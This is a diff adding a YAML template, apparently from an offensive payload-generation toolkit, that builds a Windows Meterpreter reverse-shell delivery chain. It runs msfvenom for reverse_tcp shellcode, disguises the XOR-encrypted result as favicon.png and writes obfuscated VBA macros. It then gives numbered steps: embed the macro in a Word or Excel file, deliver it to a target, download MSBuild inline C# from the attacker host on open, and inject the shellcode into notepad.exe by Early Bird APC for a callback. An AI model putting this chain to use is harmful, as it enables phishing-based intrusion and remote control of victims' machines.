@@ -1,0 +1,47 @@
+---
+metadata:
+  filename: "deliver-windows-x64-metasploit-meterpreter-tcp-shellcode-runner-vba-msbuild-apc.yaml"
+  tags: ["shell", "windows", "evasion"]
+  created: "2026-05-29"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  printf '%s\n' 'msfvenom creates the shellcode. Please wait...'; \
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} EXITFUNC=thread -f raw > packstation/outbound/shellcode.bin ; \
+  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
+  rm packstation/outbound/shellcode.bin ; \
+  python -c "import base64; open('packstation/outbound/config.xml','w').write(base64.b64decode('{{ include('payloads/msbuild-xml-apc.yaml') | base64 }}').decode())" ; \
+  python -c "import base64; open('packstation/outbound/msbuild-xmlhttp.vba','w').write(base64.b64decode('{{ include('payloads/msbuild-vba-xmlhttp.yaml') | base64 }}').decode())" ; \
+  python {{ templates_dir }}/helper_scripts/vba_macro_obfuscator.py packstation/outbound/msbuild-xmlhttp.vba -o packstation/outbound/msbuild-xmlhttp.vba --seed 1337 --junk 12 ; \
+  python -c "import base64; open('packstation/outbound/msbuild-bitsadmin.vba','w').write(base64.b64decode('{{ include('payloads/msbuild-vba-bitsadmin.yaml') | base64 }}').decode())" ; \
+  python {{ templates_dir }}/helper_scripts/vba_macro_obfuscator.py packstation/outbound/msbuild-bitsadmin.vba -o packstation/outbound/msbuild-bitsadmin.vba --seed 1337 --junk 12 ; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------Listener------                      '; \
+  printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  '; \
+  printf '%s\n' 'Step 1 - Ensure the target system has msbuild.exe installed'; \
+  printf '%s\n' '  Required: .NET Framework 4.0 at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ '; \
+  printf '%s\n' 'Step 2 - Start the meterpreter listener (see above)'; \
+  printf '%s\n' 'Step 3 - Pick a VBA download variant:'; \
+  printf '%s\n' '  msbuild-xmlhttp.vba   -> XMLHTTP/ADODB (in-process, no child process)'; \
+  printf '%s\n' '  msbuild-bitsadmin.vba -> bitsadmin via WScript.Shell (spawns cmd.exe)'; \
+  printf '%s\n' 'Step 4 - Insert the chosen VBA into an Office document:'; \
+  printf '%s\n' '  Save as .docm (Word) or .xlsm (Excel) with macros enabled'; \
+  printf '%s\n' 'Step 5 - Deliver the Office document to the target'; \
+  printf '%s\n' 'Step 6 - Attack chain on victim open:'; \
+  printf '%s\n' '  AutoOpen triggers -> downloads config.xml from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/config.xml'; \
+  printf '%s\n' '  -> saves to {{ delivery_path_windows }}\config.xml'; \
+  printf '%s\n' '  -> msbuild.exe compiles and executes inline C#'; \
+  printf '%s\n' '  -> C# downloads shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png'; \
+  printf '%s\n' '  -> injects shellcode into notepad.exe via Early Bird APC'; \
+  printf '%s\n' '  -> meterpreter callback on {{ attacker_ip }}:{{ shell_port }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Files in packstation---                   '; \
+  printf '%s\n' '  config.xml            -> MSBuild project with inline C# (fetched by VBA)'; \
+  printf '%s\n' '  favicon.png           -> XOR(0xCA) meterpreter shellcode (fetched by C#)'; \
+  printf '%s\n' '  msbuild-xmlhttp.vba   -> obfuscated VBA macro, XMLHTTP/ADODB download'; \
+  printf '%s\n' '  msbuild-bitsadmin.vba -> obfuscated VBA macro, bitsadmin download'; \
+  printf '%s\n' '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
